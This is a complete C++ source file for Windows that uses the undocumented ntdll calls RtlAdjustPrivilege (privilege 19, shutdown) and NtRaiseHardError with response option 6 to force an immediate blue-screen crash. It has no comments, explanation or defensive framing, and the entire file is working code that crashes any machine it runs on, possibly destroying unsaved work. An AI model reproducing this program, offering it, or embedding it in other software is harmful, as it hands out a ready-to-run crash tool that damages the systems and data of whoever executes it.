#include "stdafx.h"
#include <Windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMas,
	PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);

int main()
{
	BOOLEAN b;

	unsigned long response;

	RtlAdjustPrivilege(19, true, false, &b);

	NtRaiseHardError(STATUS_ASSERTION_FAILURE,0,0,0,6, &response);

	return 0;
}